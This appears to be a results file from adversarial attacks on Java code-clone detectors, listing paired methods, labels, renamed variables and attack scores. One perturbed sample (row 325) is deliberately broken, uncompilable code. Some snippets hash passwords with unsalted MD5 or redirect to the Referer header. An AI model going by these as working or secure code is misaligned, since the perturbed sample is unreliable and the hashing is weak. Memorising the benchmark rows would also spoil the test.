        String email = request.getParameter(""EmailLogin"");
        try {
            MessageDigest messageDigest = MessageDigest.getInstance(""MD5"");
            messageDigest.update(request.getParameter(""SenhaLogin"").getBytes(), 0, request.getParameter(""SenhaLogin"").length());
            senha = new BigInteger(1, messageDigest.digest()).toString(16);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        Usuario usuario = UsuarioBll.getUsuarioByEmailAndSenha(email, senha);
        String redirect = request.getHeader(""REFERER"").replace(""?msg=3"", """").replace(""&msg=3"", """") + ""?&msg=3"";
        if (request.getHeader(""REFERER"").indexOf(""?"") != -1) {
            redirect = request.getHeader(""REFERER"").replace(""?msg=3"", """").replace(""&msg=3"", """") + ""&msg=3"";
        }
        if (usuario.getNome() != null) {
            HttpSession session = request.getSession();
            session.setAttribute(""usuario"", usuario);
            redirect = ""index.jsp"";
        }
        response.sendRedirect(redirect);
    }
 <SPLIT>     public void init(ConnectionManager mgr, Hashtable cfg, Socket sock) throws RemoteException {
        _cman = mgr;
        _sock = sock;
        for (int i = 0; i < 256; i++) {
            String key = Integer.toHexString(i);
            if (key.length() < 2) key = ""0"" + key;
            availcmd.push(key);
            commands.put(key, null);
        }
        try {
            _sout = new PrintWriter(_sock.getOutputStream(), true);
            _sinp = new BufferedReader(new InputStreamReader(_sock.getInputStream()));
            String seed = """";
            Random rand = new Random();
            for (int i = 0; i < 16; i++) {
                String hex = Integer.toHexString(rand.nextInt(256));
                if (hex.length() < 2) hex = ""0"" + hex;
                seed += hex.substring(hex.length() - 2);
            }
            String pass = _mpsw + seed + _spsw;
            MessageDigest md5 = MessageDigest.getInstance(""MD5"");
            md5.reset();
            md5.update(pass.getBytes());
            String hash = hash2hex(md5.digest()).toLowerCase();
            String banner = ""INIT "" + ""servername"" + "" "" + hash + "" "" + seed;
            sendLine(banner);
            String txt = readLine(5);
            if (txt == null) {
                throw new IOException(""Slave did not send banner !!"");
            }
            String sname = """";
            String spass = """";
            String sseed = """";
            try {
                String[] items = txt.split("" "");
                sname = items[1].trim();
                spass = items[2].trim();
                sseed = items[3].trim();
            } catch (Exception e) {
                AsyncSlaveListener.invalidSlave(""INITFAIL BadKey"", _sock);
            }
            pass = _spsw + sseed + _mpsw;
            md5 = MessageDigest.getInstance(""MD5"");
            md5.reset();
            md5.update(pass.getBytes());
            hash = hash2hex(md5.digest()).toLowerCase();
            if (!sname.equals(_name)) {
                AsyncSlaveListener.invalidSlave(""INITFAIL Unknown"", _sock);
            }
            if (!spass.toLowerCase().equals(hash.toLowerCase())) {
                AsyncSlaveListener.invalidSlave(""INITFAIL BadKey"", _sock);
            }
            _cman.getSlaveManager().addSlave(_name, this, getSlaveStatus(), -1);
            start();
        } catch (IOException e) {
            if (e instanceof ConnectIOException && e.getCause() instanceof EOFException) {
                logger.info(""Check slaves.xml on the master that you are allowed to connect."");
            }
            logger.info(""IOException: "" + e.toString());
            try {
                sock.close();
            } catch (Exception e1) {
            }
        } catch (Exception e) {
            logger.warn(""Exception: "" + e.toString());
            try {
                sock.close();
            } catch (Exception e2) {
            }
        }
        System.gc();
    }
",266,,LABEL_1,LABEL_1,LABEL_1,-1,"doPost,request,response,senha,email,messageDigest,usuario,redirect,session",,,,0,,0,GA,3331,1.268553614616394,failed,[]
319,"    static void copy(String src, String dest) throws IOException {
        File ifp = new File(src);
        File ofp = new File(dest);
        if (ifp.exists() == false) {
            throw new IOException(""file '"" + src + ""' does not exist"");
        }
        FileInputStream fis = new FileInputStream(ifp);
        FileOutputStream fos = new FileOutputStream(ofp);
        byte[] b = new byte[1024];
        while (fis.read(b) > 0) fos.write(b);
        fis.close();
        fos.close();
    }
 <SPLIT>     private static void copy(String sourceName, String destName) throws IOException {
        File source = new File(sourceName);
        File dest = new File(destName);
        FileChannel in = null, out = null;
        try {
            in = new FileInputStream(source).getChannel();
            out = new FileOutputStream(dest).getChannel();
            long size = in.size();
            MappedByteBuffer buf = in.map(FileChannel.MapMode.READ_ONLY, 0, size);
            out.write(buf);
        } finally {
            if (in != null) in.close();
            if (out != null) out.close();
        }
    }
",119,,LABEL_1,LABEL_1,LABEL_1,-1,"copy,src,dest,ifp,ofp,fis,fos,b",,,,0,,0,GA,2646,0.9384858846664429,failed,[]
320,"    private static void loadDefaultSettings(final String configFileName) {
        InputStream in = null;
        OutputStream out = null;
        try {
            in = Thread.currentThread().getContextClassLoader().getResourceAsStream(META_INF_DEFAULT_CONFIG_PROPERTIES);
            out = new FileOutputStream(configFileName);
            IOUtils.copy(in, out);
        } catch (final Exception e) {
            log.warn(""Unable to pull out the default."", e);
            throw new RuntimeException(e);
        } finally {
            IOUtils.closeQuietly(in);
            IOUtils.closeQuietly(out);
        }
    }
 <SPLIT>     public static void createTar(File directoryToPack, File targetTarFile) throws IOException {
        if (directoryToPack == null) {
            throw new NullPointerException(""The parameter 'directoryToPack' must not be null"");
        }
        if (targetTarFile == null) {
            throw new NullPointerException(""The parameter 'targetTarFile' must not be null"");
        }
        if (!directoryToPack.exists() || !directoryToPack.isDirectory()) {
            throw new IllegalArgumentException(""The target file '"" + directoryToPack + ""' does not exist or is not a directory."");
        }
        if (targetTarFile.exists()) {
            log.warn(""The target file '"" + targetTarFile + ""' already exists. Will overwrite"");
        }
        log.debug(""Creating tar from all files in directory '"" + directoryToPack + ""'"");
        byte buffer[] = new byte[BUFFER_SIZE];
        FileOutputStream targetOutput = new FileOutputStream(targetTarFile);
        TarOutputStream targetOutputTar = new TarOutputStream(targetOutput);
        try {
            List<File> fileList = collectFiles(directoryToPack);
            for (Iterator<File> iter = fileList.iterator(); iter.hasNext(); ) {
                File file = iter.next();
                if (file == null || !file.exists() || file.isDirectory()) {
                    log.info(""The file '"" + file + ""' is ignored - is a directory or non-existent"");
                    continue;
                }
                if (file.equals(targetTarFile)) {
                    log.debug(""Skipping file: '"" + file + ""' - is the tar file itself"");
                    continue;
                }
                log.debug(""Adding to archive: file='"" + file + ""', archive='"" + targetTarFile + ""'"");
                String filePathInTar = getFilePathInTar(file, directoryToPack);
                log.debug(""File path in tar: '"" + filePathInTar + ""' (file="" + file + "")"");
                TarEntry tarAdd = new TarEntry(file);
                tarAdd.setModTime(file.lastModified());
                tarAdd.setName(filePathInTar);
                targetOutputTar.putNextEntry(tarAdd);
                if (file.isFile()) {
                    FileInputStream in = new FileInputStream(file);
                    try {
                        while (true) {
                            int nRead = in.read(buffer, 0, buffer.length);
                            if (nRead <= 0) break;
                            targetOutputTar.write(buffer, 0, nRead);
                        }
                    } finally {
                        StreamUtil.tryCloseStream(in);
                    }
                }
                targetOutputTar.closeEntry();
            }
        } finally {
            StreamUtil.tryCloseStream(targetOutputTar);
            StreamUtil.tryCloseStream(targetOutput);
        }
        log.info(""Tar Archive created successfully '"" + targetTarFile + ""'"");
    }
",102,,LABEL_1,LABEL_1,LABEL_1,-1,"loadDefaultSettings,configFileName,in,out",,,,0,,0,GA,1552,0.5704323887825012,failed,[]
321,"    public void getWebByUrl(String strUrl, String charset, String fileIndex) {
        try {
            System.out.println(""Getting web by url: "" + strUrl);
            addReport(""Getting web by url: "" + strUrl + ""\n"");
            URL url = new URL(strUrl);
            URLConnection conn = url.openConnection();
            conn.setDoOutput(true);
            InputStream is = null;
            is = url.openStream();
            String filePath = fPath + ""/web"" + fileIndex + "".htm"";
            PrintWriter pw = null;
            FileOutputStream fos = new FileOutputStream(filePath);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            pw = new PrintWriter(writer);
            BufferedReader bReader = new BufferedReader(new InputStreamReader(is));
            StringBuffer sb = new StringBuffer();
            String rLine = null;
            String tmp_rLine = null;
            while ((rLine = bReader.readLine()) != null) {
                tmp_rLine = rLine;
                int str_len = tmp_rLine.length();
                if (str_len > 0) {
                    sb.append(""\n"" + tmp_rLine);
                    pw.println(tmp_rLine);
                    pw.flush();
                    if (deepUrls.get(strUrl) < webDepth) getUrlByString(tmp_rLine, strUrl);
                }
                tmp_rLine = null;
            }
            is.close();
            pw.close();
            System.out.println(""Get web successfully! "" + strUrl);
            addReport(""Get web successfully! "" + strUrl + ""\n"");
            addWebSuccessed();
        } catch (Exception e) {
            System.out.println(""Get web failed!       "" + strUrl);
            addReport(""Get web failed!       "" + strUrl + ""\n"");
            addWebFailed();
        }
    }
 <SPLIT>     public boolean import_hints(String filename) {
        int pieceId;
        int i, col, row;
        int rotation;
        int number;
        boolean byurl = true;
        e2piece temppiece;
        String lineread;
        StringTokenizer tok;
        BufferedReader entree;
        try {
            if (byurl == true) {
                URL url = new URL(baseURL, filename);
                InputStream in = url.openStream();
                entree = new BufferedReader(new InputStreamReader(in));
            } else {
                entree = new BufferedReader(new FileReader(filename));
            }
            pieceId = 0;
            lineread = entree.readLine();
            tok = new StringTokenizer(lineread, "" "");
            number = Integer.parseInt(tok.nextToken());
            for (i = 0; i < number; i++) {
                lineread = entree.readLine();
                if (lineread == null) {
                    break;
                }
                tok = new StringTokenizer(lineread, "" "");
                pieceId = Integer.parseInt(tok.nextToken());
                col = Integer.parseInt(tok.nextToken()) - 1;
                row = Integer.parseInt(tok.nextToken()) - 1;
                rotation = Integer.parseInt(tok.nextToken());
                System.out.println(""placing hint piece : "" + pieceId);
                place_piece_at(pieceId, col, row, 0);
                temppiece = board.get_piece_at(col, row);
                temppiece.reset_rotation();
                temppiece.rotate(rotation);
                temppiece.set_as_hint();
            }
            return true;
        } catch (IOException err) {
            return false;
        }
    }
",322,,LABEL_1,LABEL_0,,-4,"getWebByUrl,strUrl,charset,fileIndex,url,conn,is,filePath,pw,fos,writer,bReader,sb,rLine,tmp_rLine,str_len",,,,0,,0,Greedy,1,0.0006473104159037273,,[]
322,"    public synchronized String encrypt(String plaintext) throws Exception {
        MessageDigest md = null;
        try {
            md = MessageDigest.getInstance(""SHA"");
        } catch (NoSuchAlgorithmException e) {
            throw new Exception(e.getMessage());
        }
        try {
            md.update(plaintext.getBytes(""UTF-8""));
        } catch (UnsupportedEncodingException e) {
            throw new Exception(e.getMessage());
        }
        byte raw[] = md.digest();
        String hash = (new BASE64Encoder()).encode(raw);
        return hash;
    }
 <SPLIT>     public static void copyAll(URL url, Writer out) {
        Reader in = null;
        try {
            in = new InputStreamReader(new BufferedInputStream(url.openStream()));
            copyAll(in, out);
        } catch (IOException e) {
            throw new RuntimeException(e);
        } finally {
            close(in);
        }
    }
",114,,LABEL_0,LABEL_0,LABEL_0,-1,"encrypt,plaintext,md,raw,hash",,,,0,,0,GA,1481,0.5244158148765564,failed,[]
323,"    private String readTwitterFead() {
        StringBuilder builder = new StringBuilder();
        HttpClient client = new DefaultHttpClient();
        HttpGet httpGet = new HttpGet(""http://twitter.com/statuses/user_timeline/vogella.json"");
        try {
            HttpResponse response = client.execute(httpGet);
            StatusLine statusLine = response.getStatusLine();
            int statusCode = statusLine.getStatusCode();
            if (statusCode == 200) {
                HttpEntity entity = response.getEntity();
                InputStream content = entity.getContent();
                BufferedReader reader = new BufferedReader(new InputStreamReader(content));
                String line;
                while ((line = reader.readLine()) != null) {
                    builder.append(line);
                }
            } else {
                Log.e(AndroidJsonTestingActivity.class.getName(), ""Failed to download file"");
            }
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return builder.toString();
    }
 <SPLIT>     public void generate(String urlString, String target) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
        BufferedInputStream inputStream = new BufferedInputStream(urlConnection.getInputStream());
        BufferedOutputStream outputStream = new BufferedOutputStream(new FileOutputStream(target));
        byte[] buf = new byte[10 * 1024];
        int len;
        while ((len = inputStream.read(buf, 0, buf.length)) != -1) {
            outputStream.write(buf, 0, len);
        }
        inputStream.close();
        outputStream.close();
        urlConnection.disconnect();
    }
",184,,LABEL_0,LABEL_0,LABEL_0,-1,"readTwitterFead,builder,client,httpGet,response,statusLine,statusCode,entity,content,reader,line",,,,0,,0,GA,3958,1.4194995562235515,failed,[]
324,"    public WebmillDeploy(String inputName, String outputName, boolean stripLoggers) throws Exception {
        File tempFile = null;
        JarFile jin = null;
        JarOutputStream jout = null;
        FileChannel srcChannel = null;
        FileChannel dstChannel = null;
        try {
            String portletApplicationName = getPortletApplicationName(outputName);
            System.out.println(""portletApplicationName = "" + portletApplicationName);
            tempFile = File.createTempFile(""webmill-delpoy-"", """");
            tempFile.deleteOnExit();
            jin = new JarFile(inputName);
            jout = new JarOutputStream(new FileOutputStream(tempFile));
            Document webXml = null;
            Document portletXml = null;
            Document contextXml = null;
            ZipEntry src;
            InputStream source;
            Enumeration zipEntries = jin.entries();
            while (zipEntries.hasMoreElements()) {
                src = (ZipEntry) zipEntries.nextElement();
                source = jin.getInputStream(src);
                try {
                    String target = src.getName();
                    if (WEB_INF_WEB_XML.equals(target)) {
                        System.out.println(""Found web.xml"");
                        webXml = parseXml(source);
                    } else if (WEB_INF_PORTLET_XML.equals(target)) {
                        System.out.println(""Found WEB-INF/portlet.xml"");
                        portletXml = parseXml(source);
                    } else if (META_INF_CONTEXT_XML.equals(target)) {
                        System.out.println(""Found META-INF/context.xml"");
                        contextXml = parseXml(source);
                    }
                } finally {
                    source.close();
                }
            }
            if (webXml == null) {
                throw new IllegalArgumentException(""WEB-INF/web.xml not found"");
            }
            if (portletXml == null) {
                throw new IllegalArgumentException(""WEB-INF/portlet.xml not found"");
            }
            WebmillWebApplicationRewriter webRewriter = new WebmillWebApplicationRewriter(webXml);
            webRewriter.processWebXML();
            WebmillContextRewriter contextRewriter = new WebmillContextRewriter(contextXml, portletApplicationName);
            contextRewriter.processContextXML();
            jin = new JarFile(inputName);
            zipEntries = jin.entries();
            while (zipEntries.hasMoreElements()) {
                src = (ZipEntry) zipEntries.nextElement();
                source = jin.getInputStream(src);
                try {
                    String target = src.getName();
                    String fullTarget = '/' + target;
                    if (stripLoggers && target.endsWith("".jar"") && (target.startsWith(""WEB-INF/lib/commons-logging"") || target.startsWith(""WEB-INF/lib/log4j""))) {
                        System.out.println(""Skip logger "" + target);
                        continue;
                    } else {
                        if (webRewriter.getRealPortletTldFile() != null && fullTarget.equals(webRewriter.getRealPortletTldFile())) {
                            System.out.println(""Skip portlet tld file "" + fullTarget);
                            continue;
                        } else if (target.equals(WEB_INF_WEB_XML)) {
                            System.out.println(""Skip web.xml file "" + target);
                            continue;
                        } else if (target.equals(WEB_INF_PORTLET_XML)) {
                            System.out.println(""Skip portlet.xml file "" + target);
                            continue;
                        } else if (target.equals(META_INF_CONTEXT_XML)) {
                            System.out.println(""Skip context.xml file "" + target);
                            continue;
                        }
                        System.out.println(""Add file "" + target);
                    }
                    addFile(target, source, jout);
                } finally {
                    source.close();
                }
            }
            addFile(WEB_INF_WEB_XML, webXml, jout);
            addFile(WEB_INF_PORTLET_XML, portletXml, jout);
            addFile(META_INF_CONTEXT_XML, contextXml, jout);
            System.out.println(""Attempting to add portlet.tld to war..."");
            InputStream is = this.getClass().getResourceAsStream(""/org/riverock/webmill/container/tags/portlet.tld"");
            if (is == null) {
                System.out.println(""Failed to find portlet.tld in classpath"");
            } else {
                String portletTldFile = webRewriter.getRealPortletTldFile();
                if (portletTldFile.charAt(0) == '/') {
                    portletTldFile = portletTldFile.substring(1);
                }
                System.out.println(""Adding file "" + portletTldFile);
                try {
                    addFile(portletTldFile, is, jout);
                } finally {
                    is.close();
                }
            }
            jout.close();
            jin.close();
            jin = null;
            jout = null;
            System.out.println(""Creating war "" + outputName + "" ..."");
            System.out.flush();
            srcChannel = new FileInputStream(tempFile).getChannel();
            dstChannel = new FileOutputStream(outputName).getChannel();
            dstChannel.transferFrom(srcChannel, 0, srcChannel.size());
            srcChannel.close();
            srcChannel = null;
            dstChannel.close();
            dstChannel = null;
            tempFile.delete();
            tempFile = null;
            System.out.println(""War "" + outputName + "" created"");
            System.out.flush();
        } finally {
            if (srcChannel != null && srcChannel.isOpen()) {
                try {
                    srcChannel.close();
                } catch (IOException e1) {
                }
            }
            if (dstChannel != null && dstChannel.isOpen()) {
                try {
                    dstChannel.close();
                } catch (IOException e1) {
                }
            }
            if (jin != null) {
                try {
                    jin.close();
                    jin = null;
                } catch (IOException e1) {
                }
            }
            if (jout != null) {
                try {
                    jout.close();
                    jout = null;
                } catch (IOException e1) {
                }
            }
            if (tempFile != null && tempFile.exists()) {
                tempFile.delete();
            }
        }
    }
 <SPLIT>     public static String getMD5Hash(String in) {
        StringBuffer result = new StringBuffer(32);
        try {
            MessageDigest md5 = MessageDigest.getInstance(""MD5"");
            md5.update(in.getBytes());
            Formatter f = new Formatter(result);
            for (byte b : md5.digest()) {
                f.format(""%02x"", b);
            }
        } catch (NoSuchAlgorithmException ex) {
            ex.printStackTrace();
        }
        return result.toString();
    }
",1028,,LABEL_0,LABEL_1,,-4,"inputName,outputName,stripLoggers,tempFile,jin,jout,srcChannel,dstChannel,portletApplicationName,webXml,portletXml,contextXml,src,source,zipEntries,target,webRewriter",,,,0,,0,Greedy,1,0.0009515404701232911,,[]
325,"    private void copy(File source, File destinationDirectory) throws IOException {
        if (source.isDirectory()) {
            File newDir = new File(destinationDirectory, source.getName());
            newDir.mkdir();
            File[] children = source.listFiles();
            for (int i = 0; i < children.length; i++) {
                if (children[i].getName().equals("".svn"")) {
                    continue;
                }
                copy(children[i], newDir);
            }
        } else {
            File newFile = new File(destinationDirectory, source.getName());
            if (newFile.exists() && source.lastModified() == newFile.lastModified()) {
                return;
            }
            FileOutputStream output = new FileOutputStream(newFile);
            FileInputStream input = new FileInputStream(source);
            byte[] buff = new byte[2048];
            int read = 0;
            while ((read = input.read(buff)) > 0) {
                output.write(buff, 0, read);
            }
            output.flush();
            output.close();
            input.close();
        }
    }
 <SPLIT>     public void uncaughtException(final Thread t, final Throwable e) {
        final Display display = Display.getCurrent();
        final Shell shell = new Shell(display);
        final MessageBox message = new MessageBox(shell, SWT.OK | SWT.CANCEL | SWT.ICON_ERROR);
        message.setText(""Hawkscope Error"");
        message.setMessage(e.getMessage() + ""\nSubmit Hawkscope Error Report to Issue Tracker?"");
        log.error(""Uncaught exception"", e);
        if (message.open() == SWT.OK) {
            IOUtils.copyToClipboard(Version.getBugReport(e));
            try {
                Program.launch(Constants.HAWKSCOPE_URL_ROOT + ""issues/entry?comment="" + URLEncoder.encode(""Please paste the Hawkscope Error "" + ""Report here. It's currently copied to your "" + ""clipboard. Thank you for your support!"", Constants.ENCODING));
            } catch (final Exception e1) {
                Program.launch(Constants.HAWKSCOPE_URL_ROOT + ""issues/entry"");
            }
        }
        shell.dispose();
    }
",229,"    private void transfer(File url, File destificationDir) throws IOException {
        if (url.isDirectory()) {
          newDir newDir = new FidestificationDirory, url.getName());
            newDir.mkdir();
            Fileurlren = url.listFiles();
            for hiint i hi 0; i < url.length; hi++) {
                if (url[hi].getName().equals("".svn"")) {
                    continue;
                }
                transfer(url[hi], newDir);
            }
        } else {
          newSourcenewFile = new FidestificationDirory, url.getName());
            inewSourceile.exists() && url.lastModified() == newSource.lastModified()) {
                return;
            }
            FileOutputStream oufile new FileOutputStream(newSource);
            FileInputStrerequestput = new FileInputStream(url);
            byte[] oct = new byte[2048];
            int transfer = 0;
            while ((rtransfer= requesttransferd(oct)) > 0) {
                file.write(oct, 0, transfer);
            }
            file.flush();
            file.close();
            request.close();
        }
    }
",LABEL_1,LABEL_1,0.6206541657447815,1,"copy,source,destinationDirectory,newDir,children,i,newFile,output,input,buff,read",,,,3,"copy:transfer,source:url,destinationDirectory:destificationDir,newDir:newDir,children:url,i:hi,newFile:newSource,output:file,input:request,buff:oct,read:transfer,",1,GA,928,0.3385594924290975,ga,[]
326,"    public static String str2md5(String str) {
        try {
            MessageDigest alga = MessageDigest.getInstance(MESSAGE_DIGEST_TYPE);
            alga.update(str.getBytes());
            byte[] digesta = alga.digest();
            return byte2hex(digesta);
        } catch (NoSuchAlgorithmException ex) {
            return str;
        }
    }
 <SPLIT>     public static String getHashedPassword(String password) {
        try {
            MessageDigest digest = MessageDigest.getInstance(""MD5"");
            digest.update(password.getBytes());
            BigInteger hashedInt = new BigInteger(1, digest.digest());
            return String.format(""%1$032X"", hashedInt);
        } catch (NoSuchAlgorithmException nsae) {
            System.err.println(nsae.getMessage());
        }
        return """";
    }
",62,,LABEL_1,LABEL_1,LABEL_1,-1,"str2md5,str,alga,digesta",,,,0,,0,GA,1353,0.4746631860733032,failed,[]
327,"    public static void copy(File sourceFile, File destinationFile) throws IOException {
        FileChannel sourceFileChannel = (new FileInputStream(sourceFile)).getChannel();
        FileChannel destinationFileChannel = (new FileOutputStream(destinationFile)).getChannel();
        sourceFileChannel.transferTo(0, sourceFile.length(), destinationFileChannel);
        sourceFileChannel.close();
        destinationFileChannel.close();
    }
 <SPLIT>     public void cpFile(File source, File target, boolean replace, int bufferSize) throws IOException {
        if (!source.exists()) throw new IOException(""source file not exists"");
        if (!source.isFile()) throw new IOException(""source file not exists(is a directory)"");
        InputStream src = new FileInputStream(source);
        File tarn = target;
        if (target.isDirectory() || !(!(target.exists()) || replace)) {
            String tardir = target.isDirectory() ? target.getPath() : target.getParent();
            tarn = new File(tardir + File.separator + source.getName());
            int n = 1;
            while (!(!tarn.exists() || replace)) {
                tarn = new File(tardir + File.separator + String.valueOf(n) + "" copy of "" + source.getName());
                n++;
            }
        }
        if (source.getPath().equals(tarn.getPath()) && replace) return;
        OutputStream tar = new FileOutputStream(tarn);
        byte[] bytes = new byte[bufferSize];
        int readn = -1;
        while ((readn = src.read(bytes)) > 0) {
            tar.write(bytes, 0, readn);
        }
        tar.flush();
        tar.close();
        src.close();
    }
",73,,LABEL_1,LABEL_1,LABEL_1,-1,"copy,sourceFile,destinationFile,sourceFileChannel,destinationFileChannel",,,,0,,0,GA,849,0.30770330826441444,failed,[]
328,"        private void loadBinaryStream(String streamName, InputStream streamToLoad, long sz, HttpServletRequest req, HttpServletResponse resp) throws IOException {
            resp.setContentType(getContentType(req, streamName));
            resp.setHeader(""Content-Disposition"", ""inline;filename="" + streamName);
            resp.setContentLength((int) sz);
            OutputStream out = resp.getOutputStream();
            BufferedOutputStream bos = new BufferedOutputStream(out, 2048);
            try {
                IOUtils.copy(streamToLoad, bos);
            } finally {
                IOUtils.closeQuietly(streamToLoad);
                IOUtils.closeQuietly(bos);
            }
            getCargo().put(GWT_ENTRY_POINT_PAGE_PARAM, null);
        }
 <SPLIT>     public void createJAR(String fileString, String ext) {
        try {
            File file = new File(fileString);
            int i = fileString.lastIndexOf(java.io.File.separator);
            String dir = fileString.substring(0, i + 1);
            if (ext.matches(""jar"")) {
                jarFile = new File(getClass().getClassLoader().getResource(""jsdviewer.jar"").toURI());
                java.io.FileOutputStream fstrm = new java.io.FileOutputStream(file);
                FileChannel in = (new java.io.FileInputStream(jarFile)).getChannel();
                FileChannel out = fstrm.getChannel();
                in.transferTo(0, jarFile.length(), out);
                in.close();
                out.close();
            } else {
                file.mkdir();
            }
            File.umount(file);
            File temp = new File(dir + ""document.jsd"");
            FileOutputStream fstrm2 = new FileOutputStream(temp.getCanonicalPath());
            ostrm = new ObjectOutputStream(fstrm2);
            ostrm.writeObject(doc);
            ostrm.flush();
            ostrm.close();
            File.umount();
            File docFile = new File(file.getCanonicalPath() + java.io.File.separator + ""document.jsd"");
            File.cp_p(temp, docFile);
            File.umount();
            temp.delete();
            File.umount(file);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
",121,,LABEL_1,LABEL_1,LABEL_1,-1,"loadBinaryStream,streamName,streamToLoad,sz,req,resp,out,bos",,,,0,,0,GA,2741,0.9891423185666403,failed,[]
329,"    private static void main(String[] args) {
        try {
            File f = new File(""test.txt"");
            if (f.exists()) {
                throw new IOException(f + "" already exists.  I don't want to overwrite it."");
            }
            StraightStreamReader in;
            char[] cbuf = new char[0x1000];
            int read;
            int totRead;
            FileOutputStream out = new FileOutputStream(f);
            for (int i = 0x00; i < 0x100; i++) {
                out.write(i);
            }
            out.close();
            in = new StraightStreamReader(new FileInputStream(f));
            for (int i = 0x00; i < 0x100; i++) {
                read = in.read();
                if (read != i) {
                    System.err.println(""Error: "" + i + "" read as "" + read);
                }
            }
            in.close();
            in = new StraightStreamReader(new FileInputStream(f));
            totRead = in.read(cbuf);
            if (totRead != 0x100) {
                System.err.println(""Simple buffered read did not read the full amount: 0x"" + Integer.toHexString(totRead));
            }
            for (int i = 0x00; i < totRead; i++) {
                if (cbuf[i] != i) {
                    System.err.println(""Error: 0x"" + i + "" read as 0x"" + cbuf[i]);
                }
            }
            in.close();
            in = new StraightStreamReader(new FileInputStream(f));
            totRead = 0;
            while (totRead <= 0x100 && (read = in.read(cbuf, totRead, 0x100 - totRead)) > 0) {
                totRead += read;
            }
            if (totRead != 0x100) {
                System.err.println(""Not enough read. Bytes read: "" + Integer.toHexString(totRead));
            }
            for (int i = 0x00; i < totRead; i++) {
                if (cbuf[i] != i) {
                    System.err.println(""Error: 0x"" + i + "" read as 0x"" + cbuf[i]);
                }
            }
            in.close();
            in = new StraightStreamReader(new FileInputStream(f));
            totRead = 0;
            while (totRead <= 0x100 && (read = in.read(cbuf, totRead + 0x123, 0x100 - totRead)) > 0) {
                totRead += read;
            }
            if (totRead != 0x100) {
                System.err.println(""Not enough read. Bytes read: "" + Integer.toHexString(totRead));
            }
            for (int i = 0x00; i < totRead; i++) {
                if (cbuf[i + 0x123] != i) {
                    System.err.println(""Error: 0x"" + i + "" read as 0x"" + cbuf[i + 0x123]);
                }
            }
            in.close();
            in = new StraightStreamReader(new FileInputStream(f));
            totRead = 0;
            while (totRead <= 0x100 && (read = in.read(cbuf, totRead + 0x123, 7)) > 0) {
                totRead += read;
            }
            if (totRead != 0x100) {
                System.err.println(""Not enough read. Bytes read: "" + Integer.toHexString(totRead));
            }
            for (int i = 0x00; i < totRead; i++) {
                if (cbuf[i + 0x123] != i) {
                    System.err.println(""Error: 0x"" + i + "" read as 0x"" + cbuf[i + 0x123]);
                }
            }
            in.close();
            f.delete();
        } catch (IOException x) {
            System.err.println(x.getMessage());
        }
    }
 <SPLIT>     protected File EncodeReturn() throws EncodeFailedException, IOException {
        CryptoClient c = getNode().getCryptoClientByID(PiggybackCrypto);
        File tmpf = getNode().getTempFM().createNewFile(""encodereturn"", ""download"");
        ChannelWriter cw = new ChannelWriter(tmpf);
        cw.putLongFile(DownloadData);
        cw.close();
        File encdata = c.RawEncode(tmpf, RawKey);
        File pigdata = PigData.EncodeData(encdata);
        File pigroute = ReturnPigRoute.EncodeData(ReturnRouteFile);
        FileOutputStream fos = new FileOutputStream(pigroute, true);
        FileChannel foc = fos.getChannel();
        FileInputStream fis = new FileInputStream(pigdata);
        FileChannel fic = fis.getChannel();
        fic.transferTo(0, fic.size(), foc);
        foc.close();
        fic.close();
        pigdata.delete();
        ReturnRouteFile.delete();
        encdata.delete();
        return pigroute;
    }
",697,,LABEL_1,LABEL_1,LABEL_1,-1,"f,in,cbuf,read,totRead,out,i",,,,0,,0,GA,2962,1.1779926101366678,failed,[]
330,"    public static String SHA1(String text) {
        byte[] sha1hash = new byte[40];
        try {
            MessageDigest md = MessageDigest.getInstance(""SHA-1"");
            md.update(text.getBytes(""iso-8859-1""), 0, text.length());
            sha1hash = md.digest();
        } catch (UnsupportedEncodingException ex) {
            Logger.getLogger(Converter.class.getName()).log(Level.SEVERE, null, ex);
        } catch (NoSuchAlgorithmException ex) {
            Logger.getLogger(Converter.class.getName()).log(Level.SEVERE, null, ex);
        }
        return convertToHex(sha1hash);
    }
 <SPLIT>     public static void doVersionCheck(View view) {
        view.showWaitCursor();
        try {
            URL url = new URL(jEdit.getProperty(""version-check.url""));
            InputStream in = url.openStream();
            BufferedReader bin = new BufferedReader(new InputStreamReader(in));
            String line;
            String develBuild = null;
            String stableBuild = null;
            while ((line = bin.readLine()) != null) {
                if (line.startsWith("".build"")) develBuild = line.substring(6).trim(); else if (line.startsWith("".stablebuild"")) stableBuild = line.substring(12).trim();
            }
            bin.close();
            if (develBuild != null && stableBuild != null) {
                doVersionCheck(view, stableBuild, develBuild);
            }
        } catch (IOException e) {
            String[] args = { jEdit.getProperty(""version-check.url""), e.toString() };
            GUIUtilities.error(view, ""read-error"", args);
        }
        view.hideWaitCursor();
    }
",135,,LABEL_0,LABEL_0,LABEL_0,-1,"SHA1,text,sha1hash,md",,,,0,,0,GA,1529,0.5469138582547506,failed,[]
331,"    public void importSequences() {
        names = new ArrayList<String>();
        sequences = new ArrayList<String>();
        try {
            InputStream is = urls[urlComboBox.getSelectedIndex()].openStream();
            ImportHelper helper = new ImportHelper(new InputStreamReader(is));
            int ch = helper.read();
            while (ch != '>') {
                ch = helper.read();
            }
            do {
                String line = helper.readLine();
                StringTokenizer tokenizer = new StringTokenizer(line, "" \t"");
                String name = tokenizer.nextToken();
                StringBuffer seq = new StringBuffer();
                helper.readSequence(seq, "">"", Integer.MAX_VALUE, ""-"", ""?"", """", null);
                ch = helper.getLastDelimiter();
                names.add(name);
                sequences.add(seq.toString());
            } while (ch == '>');
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (EOFException e) {
        } catch (IOException e) {
        }
    }
 <SPLIT>     public static String SHA1(String text) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        MessageDigest md;
        md = MessageDigest.getInstance(""SHA-1"");
        byte[] sha1hash = new byte[40];
        md.update(text.getBytes(""iso-8859-1""), 0, text.length());
        sha1hash = md.digest();
        return convertToHex(sha1hash);
    }
",216,,LABEL_0,LABEL_0,LABEL_0,-1,"importSequences,names,sequences,is,helper,ch,line,tokenizer,name,seq",,,,0,,0,GA,3605,1.2922514001528422,failed,[]
332,"    public void parse(InputStream stream, ContentHandler handler, Metadata metadata, ParseContext context) throws IOException, SAXException, TikaException {
        String name = metadata.get(Metadata.RESOURCE_NAME_KEY);
